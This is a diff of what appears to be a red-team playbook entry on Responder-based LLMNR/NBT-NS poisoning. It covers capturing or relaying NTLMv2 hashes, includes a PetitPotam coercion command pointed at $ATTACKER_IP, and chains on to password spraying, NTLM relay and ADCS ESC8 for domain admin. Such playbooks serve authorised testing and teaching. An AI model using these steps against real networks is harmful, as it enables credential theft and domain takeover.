@@ -13,9 +13,15 @@ leads_to:
 
 ## Prerequisites
 
-On the same network segment as Windows hosts. LLMNR and NBT-NS must not be disabled by GPO (check via responder output — if hashes roll in within minutes, it's working). Start this before doing anything else.
+- On the same network segment as Windows hosts
 
-Responder answers broadcast name resolution queries that every Windows machine sends when DNS fails. The machine authenticating leaks its NTLMv2 hash — either crack it offline or relay it to a target with signing disabled. The critical decision is relay vs capture: **if any targets have SMB signing disabled, relay; otherwise capture and crack**.
+- LLMNR and NBT-NS must not be disabled by GPO (check via responder output — hashes rolling in within minutes means it's working)
+
+- Start this before doing anything else
+
+- Responder answers broadcast name resolution queries every Windows machine sends when DNS fails — the authenticating machine leaks its NTLMv2 hash
+
+- Critical decision is relay vs capture: **if any targets have SMB signing disabled, relay; otherwise capture and crack**
 
 ## Decision: Relay or Capture?
 
@@ -61,4 +67,8 @@ python3 PetitPotam.py -u user -p password $ATTACKER_IP $TARGET
 
 ## Leads To
 
-Captured hash cracked → password-spray with the plaintext credential. Unsigned targets present → ntlm-relay for direct shell or ADCS ESC8 relay. Coercing the DC into authenticating → combine with ntlm-relay to ADCS for domain-admin certificate path.
+- Captured hash cracked → `password-spray` with the plaintext credential
+
+- Unsigned targets present → `ntlm-relay` for direct shell or ADCS ESC8 relay
+
+- Coercing the DC into authenticating → combine with `ntlm-relay` to ADCS for domain-admin certificate path
